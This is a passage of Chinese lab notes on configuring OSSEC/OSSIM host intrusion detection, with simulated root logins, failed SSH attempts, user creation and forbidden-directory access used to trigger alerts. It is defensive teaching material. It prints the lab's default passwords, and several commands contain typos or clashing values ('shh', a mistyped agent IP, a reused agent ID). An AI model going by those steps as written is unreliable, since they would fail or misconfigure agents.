<h3 id="1-4-操作步骤-1"><a href="#1-4-操作步骤-1" class="headerlink" title="1.4 操作步骤"></a>1.4 操作步骤</h3><h4 id="一、安装OSSEC-HIDS-Windows-Agent工具软件"><a href="#一、安装OSSEC-HIDS-Windows-Agent工具软件" class="headerlink" title="一、安装OSSEC HIDS Windows Agent工具软件"></a>一、安装OSSEC HIDS Windows Agent工具软件</h4><p>1.1在windows2012上，安装OSSEC代理软件。OSSEC安装成功后，将出现如图所示的安装成功提示窗口。单击该窗口的“Finish”按钮，关闭该窗口，即可完成OSSEC安装过程。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530115809910.png" alt="image-20200530115809910"></p>
<p>1.2由于OSSEC服务器安装于OSSIM系统中,所以OSSEC服务器IP为192.168.1.200，而Authentication key为服务器产生的密钥，由OSSIM系统生成，如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530113309941.png" alt="image-20200530113309941"></p>
<h4 id="二、在Windows平台下安装和配置OSSEC代理"><a href="#二、在Windows平台下安装和配置OSSEC代理" class="headerlink" title="二、在Windows平台下安装和配置OSSEC代理"></a>二、在Windows平台下安装和配置OSSEC代理</h4><p>1.3在windows2012操作系统（服务器IP地址：192.168.1.5）中，使用putty远程登录OSSIM服务器（用户名：root，密码：Simplexue123）。注意Host Name（or IP address）配置为OSSEC服务器的IP地址192.168.1.200。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530113320935.png" alt="image-20200530113320935"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530113324293.png" alt="image-20200530113324293"></p>
<p>1.4在windows2012上，使用putty终端启动OSSEC代理管理程序，创建新OSSEC代理（名称：windows2012、ID：006），生成密钥。</p>
<blockquote>
<p>提示：可以使用Windows2012上现有的PuTTY工具来完成操作步骤1.4，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/ossec/bin/manage_agents</span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">A</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">windows2012</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">192.168.2.5</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">006</span></span><br><span class="line"></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">enter</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">E</span></span><br><span class="line"><span class="meta">ouput&gt;</span><span class="bash">&gt;&gt;<span class="comment">#KEY#</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531202927616.png" alt="image-20200531202927616"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531203302047.png" alt="image-20200531203302047"></p>
<p>1.5在OSSET AGENT管理器窗口Authentication key栏里输入生成的密钥并保存。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531203243131.png" alt="image-20200531203243131"></p>
<p>1.6启动新建的OSSEC代理，查看该代理成功运行后的运行状态信息。</p>
<blockquote>
<p>提示：在服务端进行配置时，使用/var/ossec/bin/manage_agents管理代理程序，具体使用方法自行查询。</p>
</blockquote>
<blockquote>
<p>在CentOS7上配置代理端时，使用/var/ossec/bin/manage_agents进行配置，具体使用方法自行摸索。</p>
</blockquote>
<p><a href="https://ossec-docs.readthedocs.io/en/latest/docs/manual/agent/agent-management.html#manage-agents-on-ossec-agents" target="_blank" rel="noopener">ossec官方手册</a></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530121757332.png" alt="image-20200530121757332"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531214113833.png" alt="image-20200531214113833"></p>
<h4 id="三、在Linux平台下安装和配置OSSEC代理"><a href="#三、在Linux平台下安装和配置OSSEC代理" class="headerlink" title="三、在Linux平台下安装和配置OSSEC代理"></a>三、在Linux平台下安装和配置OSSEC代理</h4><p>本实验任务操作环境已经在Linux系统平台中安装了OSSEC代理,所以在此只需要完成OSSEC代理配置即可。</p>
<p>1.7切换到CentOS7虚拟机（IP为192.168.1.6），使用root账户（用户名：root，密码：Simplexue123）登录并切换到桌面模式，打开CentOS7终端。</p>
<p>⭐登陆后输入startx进入GUI</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530122123725.png" alt="image-20200530122123725"></p>
<p>1.8通过CentOS7终端SSH远程登录OSSIM服务器（IP为192.168.1.200）。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shh root@192.168.1.200</span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">yse</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">Simplexue123</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530122500028.png" alt="image-20200530122500028"></p>
<p>1.9在远程登录的192.168.1.200终端打开OSSEC代理管理器程序，新建一个代理，将代理名称设为CentOS7，代理IP为192.168.1.6，生成并添加密钥。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/ossec/bin/manage_agents</span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">A</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">CentOS7</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">192.168.1.6</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">006</span></span><br><span class="line"></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">enter</span></span><br><span class="line"><span class="meta">input&gt;</span><span class="bash">E</span></span><br><span class="line"><span class="meta">ouput&gt;</span><span class="bash">&gt;&gt;<span class="comment">#KEY#</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531204226152.png" alt="image-20200531204226152"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531204419238.png" alt="image-20200531204419238"></p>
<p>1.10打开CentOS7终端，切换到root用户，查看ossec.conf配置文件是否包含以下代码，若没有IP地址就需要手工添加这几行代码。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ossec_config</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">client</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">server-ip</span>&gt;</span>192.168.1.200<span class="tag">&lt;/<span class="name">server-ip</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">client</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">cat /var/ossec/etc/ossec.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530124619554.png" alt="image-20200530124619554"></p>
<p>1.11在终端保存agent.conf文件内容，重新启动OSSEC服务，查看OSSEC服务成功运行后的运行状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch &#x2F;var&#x2F;ossec&#x2F;etc&#x2F;shared&#x2F;agent.conf</span><br><span class="line">&#x2F;var&#x2F;ossec&#x2F;bin&#x2F;ossec-control restart</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531204712572.png" alt="image-20200531204712572"></p>
<p>启动，同win10</p>
<h3 id="1-5-实验结果提交"><a href="#1-5-实验结果提交" class="headerlink" title="1.5 实验结果提交"></a>1.5 实验结果提交</h3><blockquote>
<p>将代理成功运行后的运行状态作为实验结果提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200530125039630.png" alt="image-20200530125039630"></p>
<h2 id="任务二-监视OSSIM服务器本地root用户的登录情况"><a href="#任务二-监视OSSIM服务器本地root用户的登录情况" class="headerlink" title="任务二 监视OSSIM服务器本地root用户的登录情况"></a>任务二 监视OSSIM服务器本地root用户的登录情况</h2><h3 id="【任务描述】"><a href="#【任务描述】" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务一完成的基础上，主要完成以下内容：</p>
<pre><code>在OSSIM集成检测平台上设置规则。
使用PuTTY远程连接OSSIM服务器，模拟攻击者破解服务器的用户名和密码后登陆服务器。
查看入侵检测系统检测到的报警信息，理解入侵检测系统对于监视用户登录情况的重要性。</code></pre><p>通过完成本实验任务，要求学生熟悉OSSEC入侵检测系统的原理和功能，掌握OSSEC入侵检测系统在监视OSSIM服务器用户登录情况时应该如何设置规则，进一步了解入侵检测的实现方式和原理。</p>
<h3 id="【实验目标】"><a href="#【实验目标】" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>理解入侵检测的概念、原理，掌握入侵检测规则的设置方法。
了解PuTTY工具的基本功能，掌握使用PuTTY远程登录服务器的方法。
了解OSSIM集成检测平台的功能，掌握该平台报警信息的筛选与查看方法。
熟悉OSSEC入侵检测系统的工作原理和常用功能，掌握OSSEC入侵检测系统报警信息的查看方法。</code></pre><p>通过入侵检测规则的设置、模拟用户登录、查看报警信息，了解OSSEC入侵检测系统监视OSSIM用户登录情况的方式和原理，进一步加深对入侵检测的了解，具备使用入侵检测系统设置规则，监视相关服务情况的能力。</p>
<h3 id="【实验工具】"><a href="#【实验工具】" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>ossim</li>
<li>ossec</li>
<li>putty</li>
<li>Firefox</li>
</ul>
<h3 id="【操作步骤】"><a href="#【操作步骤】" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>2.1在windows2012上使用火狐浏览器访问OSSIM集成监测平台Web GUI界面，输入用户名admin和密码Simplexue123进行登录。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531214615905.png" alt="image-20200531214615905"></p>
<p>2.2OSSIM系统已经默认设置了很多常规适用的入侵检测规则，我们不需要另行配置就可以直接使用。除此之外，我们还需要在OSSIM集成检测平台上通过修改ossec.conf规则配置文件来设置OSSEC系统的入侵检测规则。在OSSIM web页面中，单击Analysis—&gt;Detection—&gt;HIDS—&gt;Config—&gt;Ossec.conf，可以看到OSSIM集成检测平台已经默认监视了日志文件/var/log/auth.log。如果在Ossec.conf文件中没有找到关于auth.log的监控信息，请自行添加该部分内容的规则配置信息，如图红色框内容所示。</p>
<blockquote>
<p>提示：配置文件Ossec.conf位于Analysis—&gt;Detection模块，OSSIM服务器记录用户登录情况的文件为auth.log。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531214747727.png" alt="image-20200531214747727"></p>
<p>需要注意的是，这里使用的日志访问处理模式为syslog，syslog机制负责记录内核和应用程序产生的日志信息，管理员可以通过查看日志记录，来掌握系统状况。syslog也是一种协议，广泛用于系统日志，syslog系统日志消息可以记录在本地，也可以发送到接受syslog日志的服务器统一进行存储和处理，也可以解析其中的内容做相应的处理。ossec本身对所收集日志的传输（传输给OSSIM服务器）也是通过syslog来完成。ossec代理收集日志并传输给OSSIM服务器，最重要的意义是系统管理者可以根据日志进行入侵行为分析。</p>
<p>收集日志的作用：</p>
<pre><code>从安全方面来考虑主要是为了能够在出现问题时或出现安全问题后可以查询到日志，来追溯攻击者；
从运维层面来说，收集系统日志对于系统管理员处理各种故障来说，可以提供很大便利性，另外可以方便运维排除故障及解决问题；
起到备份作用，需要对日志进行安全保存，避免因为黑客入侵导致的日志丢失。</code></pre><p>2.3重启OSSIM服务器，重启登录成功后进入图形操作界面，按Ctrl+Alt+F1切换到命令行界面.输入用户名root和密码Simplexue123进行登录，再输入命令exit退出登录，之后按Ctrl+Alt+F7回到图形界面。图形界面和命令行界面的切换登录是为了给OSSEC入侵检测系统提供OSSIM服务器的root用户本地登录检测信息源，以便OSSEC系统获取root用户本地登录的相关日志信息。</p>
<p>按Ctrl+Alt+F1切换到命令行界面：</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531215104467.png" alt="image-20200531215104467"></p>
<p>再输入命令exit退出登录</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531215143302.png" alt="image-20200531215143302"></p>
<p>之后按Ctrl+Alt+F7回到图形界面。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531215228994.png" alt="image-20200531215228994"></p>
<p>2.4在windows2012上远程连接到服务器192.168.1.200。</p>
<blockquote>
<p>提示：可以使用Windows2012上现有的PuTTY工具来完成操作步骤2.4，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531224655569.png" alt="image-20200531224655569"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531215403270.png" alt="image-20200531215403270"></p>
<p>2.5在windows2012的OSSIM Web页面上，单击Analysis—&gt; Security Events (SIEM)，可以看到，Security Events页面中列出了OSSIM系统预设检测规则适用范围内的所有安全事件日志信息，可以找到通过putty远程登录时相关的SSH登录记录报警信息。该日志信息可作为系统管理员判断本次远程登录是否为非法入侵的重要报警信息。如果OSSIM服务器不允许root用户的远程登录操作，那么root用户的本次远程登录操作将被视为黑客入侵行为。</p>
<blockquote>
<p>将root用户远程登录成功后OSSIM监测到的SShd登录成功的报警日志的signature信息作为实验结果提交。signature信息示例如下图蓝色框内容所示。</p>
</blockquote>
<blockquote>
<p>此处第一次实验结果提交SShd：Login successful, Accepted password</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531215609895.png" alt="image-20200531215609895"></p>
<p>2.6在OSSIM web页面搜索框输入ossec，回车进行ossec报警数据过滤，如图2-3所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531215722930.png" alt="image-20200531215722930"></p>
<p>2.7因为OSSEC入侵检测系统监控了/var/log/auth.log文件，所以在OSSIM集成检测平台的OSSIM Web页面，除了记录SSH远程登录的相关安全日志信息，还会记录OSSEC报警信息，该报警信息可作为判断本次远程登录是否为非法入侵的重要依据。</p>
<p>2.8此外还可以看到本地root用户成功登录OSSIM服务器系统的日志信息。如果root用户的合法管理员没有在这个时间本地登录OSSIM服务器，那么可以断定，本次root用户登录操作为入侵行为。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531221112389.png" alt="image-20200531221112389"></p>
<h3 id="【实验结果提交】"><a href="#【实验结果提交】" class="headerlink" title="【实验结果提交】"></a>【实验结果提交】</h3><blockquote>
<p>将root用户远程登录成功后OSSIM监测到的SSH登录身份验证成功的报警日志的signature信息作为实验结果提交。提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531221147313.png" alt="image-20200531221147313"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531221046059.png" alt="image-20200531221046059"></p>
<h2 id="任务三-基于SSH的远程非法入侵检测"><a href="#任务三-基于SSH的远程非法入侵检测" class="headerlink" title="任务三 基于SSH的远程非法入侵检测"></a>任务三 基于SSH的远程非法入侵检测</h2><h3 id="【任务描述】-1"><a href="#【任务描述】-1" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务一完成的基础上，主要完成以下内容：</p>
<pre><code>在OSSIM集成检测平台上设置ossec入侵检测规则。
使用PuTTY远程连接OSSIM服务器，使用root用户名,多次尝试错误密码登录服务器。
查看入侵检测系统检测到的ossec报警信息，理解ossec报警信息对于黑客入侵行为分析和防范的重要价值。</code></pre><p>通过完成本实验任务，要求学生熟悉OSSEC入侵检测系统的原理、功能和检测规则设置方法，能够根据OSSIM平台收集的OSSEC报警信息分析黑客的入侵行为，进而采取适当的入侵防范方法，确保信息系统不受侵犯，最终具备信息系统安全管理和入侵防范能力。</p>
<h3 id="【实验目标】-1"><a href="#【实验目标】-1" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>理解入侵检测的概念、原理，掌握入侵检测规则的设置方法。
了解PuTTY工具的基本功能，掌握使用PuTTY远程登录服务器的方法。
了解OSSIM集成检测平台的功能，掌握该平台报警信息的筛选与查看方法。
熟悉OSSEC入侵检测系统的工作原理和常用功能，掌握OSSEC入侵检测系统报警信息的查看方法。
能够根据OSSIM平台收集的OSSEC报警信息分析黑客的入侵行为，进而采取适当的入侵防范方法，维护信息系统安全。
掌握入侵检测和防范技术，具备信息系统安全管理和入侵防范能力。</code></pre><h3 id="【实验工具】-1"><a href="#【实验工具】-1" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>OSSIM</li>
<li>OSSEC</li>
<li>Firefox</li>
<li>PuTTY</li>
</ul>
<h3 id="【操作步骤】-1"><a href="#【操作步骤】-1" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>3.1使用putty工具远程登录OSSIM服务器，在打开的终端中，使用CD命令进入“/var/ossec/rules”目录（该目录为OSSEC服务器的检测规则文件存储目录），并使用ls命令查看所有的OSSEC服务器端检测规则文件。可以修改这些文件的预设规则配置，来实现用户需要的自定义系统安全检测规则。其中，sshd_rules.xml为我们本实验任务需要自定义检测规则的文件，通过自定义规则，以实现收集root用户远程非法登录OSSIM服务器的报警信息的目的，为判定、分析入侵行为和动机提供重要依据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/ossec/rules</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531222934936.png" alt="image-20200531222934936"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim sshd_rules.xml</span><br><span class="line"><span class="meta">#</span><span class="bash">i插入</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ESC :wq!强行保存</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531223026065.png" alt="image-20200531223026065"></p>
<p>3.2修改sshd_rules.xml规则文件中的其中一条（rule id号为5719），将level级别设置为2（level级别越高，优先级就越高，与该规则对应的报警信息将更优先被OSSIM服务器响应和处理），告警阈值设置为2次。该规则表示：当非法用户存在2次以上远程登录尝试操作，且操作时间超过30秒，那么将触发非法远程登录尝试报警。修改完sshd_rules.xml文件后保存并退出编辑状态。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531222932652.png" alt="image-20200531222932652"></p>
<p>3.3重新启动ossec服务器，以使sshd_rules.xml文件配置生效，所用的操作命令为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/ossec/bin/ossec-control stop</span><br><span class="line">/var/ossec/bin/ossec-control start</span><br><span class="line">或者直接用如下一条命令也可以重启ossec服务器：</span><br><span class="line">/var/ossec/bin/ossec-control restart</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531222930421.png" alt="image-20200531222930421"></p>
<p>3.4利用ssh尝试登录服务器，可以用任意错误密码尝试登录，注意至少尝试2次错误登录密码，操作时长30秒以后，才能触发自定义的报警规则。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531224644874.png" alt="image-20200531224644874"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531223526303.png" alt="image-20200531223526303"></p>
<p>3.5在ossim web端，输入ossec进行ossec报警信息筛选，可以看到root用户两次使用空密码登录失败的多条报警信息，如图所示。该信息可以作为判定黑客多次登录尝试的入侵行为重要依据。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531223505353.png" alt="image-20200531223505353"></p>
<h3 id="【实验结果提交】-1"><a href="#【实验结果提交】-1" class="headerlink" title="【实验结果提交】"></a>【实验结果提交】</h3><blockquote>
<p>将OSSIM集成监测平台web页面中监测到的root用户远程登录身份验证失败的ossec报警信息的signature作为实验结果提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531223448057.png" alt="image-20200531223448057"></p>
<h2 id="任务四-监视CentOS7-root用户情况"><a href="#任务四-监视CentOS7-root用户情况" class="headerlink" title="任务四 监视CentOS7 root用户情况"></a>任务四 监视CentOS7 root用户情况</h2><h3 id="【任务描述】-2"><a href="#【任务描述】-2" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务一完成的基础上，主要完成以下内容：</p>
<pre><code>在CentOS7代理端设置规则。
使用PuTTY远程连接CentOS7，模拟攻击者破解监控的服务器的用户名和密码后登录服务器。
查看OSSEC入侵检测系统检测到的报警信息，理解入侵检测系统对于监视用户登录情况的重要性。</code></pre><p>通过完成本实验任务，要求学生掌握OSSEC入侵检测系统在监视Linux代理端用户登录情况时应该如何设置规则，深入理解入侵检测的工作原理和实施方法。</p>
<h3 id="【实验目标】-2"><a href="#【实验目标】-2" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>掌握入侵检测的概念、原理，掌握入侵检测规则的设置方法。
熟悉PuTTY工具的基本功能，掌握使用PuTTY远程登录服务器的方法。
熟悉OSSIM集成检测平台的功能，掌握该平台报警信息的筛选与查看方法。
熟悉OSSEC入侵检测系统的工作原理和常用功能，掌握OSSEC入侵检测系统报警信息的查看方法。</code></pre><p>通过入侵检测规则的设置、模拟用户登录、查看报警信息，了解OSSEC入侵检测系统监视CentOS7等代理端用户登录情况的方式和原理，进一步加深对入侵检测原理和方法的理解，具备使用入侵检测系统设置规则，监视相关服务情况的入侵检测和信息安全管理能力。</p>
<h3 id="【实验工具】-2"><a href="#【实验工具】-2" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>ossim</li>
<li>ossec</li>
<li>putty</li>
<li>firefox</li>
</ul>
<h3 id="【操作步骤】-2"><a href="#【操作步骤】-2" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>4.1在OSSIM集成检测平台上设置规则，监测CentOS7用户情况。在CentOS7终端查看代理的配置文件，可以看到OSSIM集成检测平台默认监控/var/log/secure文件，如果没有该文件监控内容，请自行添加，如图所示。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531224407524.png" alt="image-20200531224407524"></p>
<p>4.2重启OSSIM服务器（192.168.1.200）。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531231034090.png" alt="image-20200531231034090"></p>
<p>4.3使用工具模拟攻击者远程登录服务器（用户名root和密码Simplexue123）。</p>
<blockquote>
<p>提示：可以使用Windows2012上现有的PuTTY工具来完成操作步骤4.3，也可以通过操作机自行上传其他工具来完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531224637643.png" alt="image-20200531224637643"></p>
<p>4.4在服务器终端输入命令“adduser simpleware”、“passwd simpleware”，添加新用户simpleware，并将其密码设为Simplexue123。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531224853019.png" alt="image-20200531224853019"></p>
<p>4.5回到OSSIM Web页面上，进行OSSEC警报数据的过滤，可以看到与CentOS7添加新用户相关的OSSEC报警信息。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531224956968.png" alt="image-20200531224956968"></p>
<p>4.6查看入侵检测系统检测到的报警信息，获得报警信息的字段特征。</p>
<blockquote>
<p>提示：报警信息位于Analysis—&gt; Security Events (SIEM)，可对报警信息进行筛选来快速进行查看。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531225021233.png" alt="image-20200531225021233"></p>
<h3 id="【实验结果提交】-2"><a href="#【实验结果提交】-2" class="headerlink" title="【实验结果提交】"></a>【实验结果提交】</h3><blockquote>
<p>将OSSIM集成监测平台web页面中监测到的OSSEC代理新建用户的报警信息的signature作为实验结果提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531225047277.png" alt="image-20200531225047277"></p>
<h2 id="任务五-监控Web服务器的访问日志"><a href="#任务五-监控Web服务器的访问日志" class="headerlink" title="任务五 监控Web服务器的访问日志"></a>任务五 监控Web服务器的访问日志</h2><h3 id="【任务描述】-3"><a href="#【任务描述】-3" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务在任务一完成的基础上，主要完成以下内容：</p>
<pre><code>在CentOS7代理端设置监视Web服务器访问日志的规则。
访问CentOS7 Web服务器被禁止访问的目录。
查看入侵检测系统检测到的报警信息，理解入侵检测系统对于监视被禁止访问的目录的重要性。</code></pre><p>通过完成本实验任务，要求学生掌握OSSEC入侵检测平台要监视Web服务器访问日志时应该如何设置规则，掌握入侵检测的实现方式和原理，具备入侵检测实施能力和信息系统安全管理能力。</p>
<h3 id="【实验目标】-3"><a href="#【实验目标】-3" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>充分理解入侵检测的概念、原理、方法和流程，掌握入侵检测规则的设置方法。
熟悉OSSIM集成检测平台的功能，掌握其报警信息的筛选与查看方法。</code></pre><p>通过入侵检测规则的设置、模拟入侵者访问被禁止访问的目录、查看报警信息，理解OSSEC入侵检测系统监视Web服务器的访问日志的方式和原理，进一步加深对入侵检测的理解，具备使用入侵检测系统设置规则，监视相关服务情况的能力。具备企业信息系统入侵检测实施能力和信息系统安全管理能力。</p>
<h3 id="【实验工具】-3"><a href="#【实验工具】-3" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>ossim</li>
<li>ossec</li>
<li>putty</li>
<li>firefox</li>
</ul>
<h3 id="【操作步骤】-3"><a href="#【操作步骤】-3" class="headerlink" title="【操作步骤】"></a>【操作步骤】</h3><p>我们都知道，网站有些目录是禁止访问的，如果有人尝试访问，那么有可能是入侵征兆。</p>
<p>5.1在CentOS7的终端修改ossec.conf文件，向该文件中添加如下内容，实现监控Web服务器的访问日志的功能。编辑完后按esc键退出文件编辑状态，并输入:wq命令保存文件。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localfile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log_format</span>&gt;</span>apache<span class="tag">&lt;/<span class="name">log_format</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/var/log/httpd/access_log<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">localfile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>用vim编辑</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /var/ossec/etc/ossec.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531225837667.png" alt="image-20200531225837667"></p>
<p>添加上面的内容</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531230241222.png" alt="image-20200531230241222"></p>
<p>5.2在终端输入命令“/var/ossec/bin/ossec-control restart”，重新启动OSSEC服务。</p>
<blockquote>
<p>提示：配置文件Ossec.conf位于/var/ossec目录下，CentOS7 Web服务器的访问日志为access_log。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531230334816.png" alt="image-20200531230334816"></p>
<p>5.3在windows2012上访问被禁止访问的目录。在windows2012（IP为192.168.1.5）的火狐浏览器上新打开一个页面，访问<code>http://192.168.1.6/dvwa/config</code>，提示信息为Forbidden（禁止访问）。</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200531231711024.png" alt="image-20200531231711024"></p>
<p>5.4回到OSSIM Web页面上，进行OSSEC警报数据的过滤，可以看到访问禁止目录时的报警信息。</p>
<blockquote>
<p>提示：报警信息位于Analysis—&gt; Security Events (SIEM)，可对报警信息进行筛选来快速进行查看。</p>
</blockquote>
<p><code>ossec:Web server 400 error code</code></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200611175258798.png" alt="image-20200611175258798"></p>
<h3 id="【实验结果提交】-3"><a href="#【实验结果提交】-3" class="headerlink" title="【实验结果提交】"></a>【实验结果提交】</h3><blockquote>
<p>将OSSEC入侵检测系统监测到的访问被禁止目录的报警信息的signature作为实验结果提交，提交成功后该实验任务完成。</p>
</blockquote>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200611175246058.png" alt="image-20200611175246058"></p>
<h1 id="VPN实验"><a href="#VPN实验" class="headerlink" title="VPN实验"></a>VPN实验</h1><h2 id="任务一-使用IP命令搭建基于隧道的虚拟专有网络"><a href="#任务一-使用IP命令搭建基于隧道的虚拟专有网络" class="headerlink" title="任务一.使用IP命令搭建基于隧道的虚拟专有网络"></a>任务一.使用IP命令搭建基于隧道的虚拟专有网络</h2><h3 id="【任务描述】-4"><a href="#【任务描述】-4" class="headerlink" title="【任务描述】"></a>【任务描述】</h3><p>本实验任务基于真实企业网络环境，在两台不同网络环境的环境中，主要完成以下内容：</p>
<p>实现两不同网络内的内网通过ip隧道使之互通并检测。</p>
<h3 id="【实验目标】-4"><a href="#【实验目标】-4" class="headerlink" title="【实验目标】"></a>【实验目标】</h3><pre><code>了解企业网络环境如何使不同网络之间内网互通。
掌握ip 命令的使用。
掌握虚拟私有网络实现方法。</code></pre><h3 id="【实验工具】-4"><a href="#【实验工具】-4" class="headerlink" title="【实验工具】"></a>【实验工具】</h3><ul>
<li>ip</li>
<li>modprobe</li>
</ul>
